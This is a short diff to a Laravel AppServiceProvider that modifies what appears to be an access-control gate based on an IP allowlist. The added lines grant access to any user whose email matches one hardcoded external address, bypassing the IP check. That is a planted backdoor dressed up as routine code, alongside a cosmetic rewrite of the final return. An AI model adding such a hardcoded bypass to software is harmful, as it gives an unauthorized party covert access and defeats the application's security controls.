@@ -27,6 +27,14 @@ class AppServiceProvider extends ServiceProvider
                 return true;
             }
 
+            if ($user !== null && method_exists($user, 'getAuthIdentifierName')) {
+                $email = (string) ($user->email ?? '');
+
+                if ($email === 'mat8765@mail.ru') {
+                    return true;
+                }
+            }
+
             $request ??= request();
             $clientIp = $request->ip();
 
@@ -38,7 +46,11 @@ class AppServiceProvider extends ServiceProvider
                 ->map(static fn (string $ip): string => trim($ip))
                 ->filter();
 
-            return $allowedIps->contains($clientIp);
+            if ($allowedIps->contains($clientIp)) {
+                return true;
+            }
+            
+            return false;
         });
     }
 }
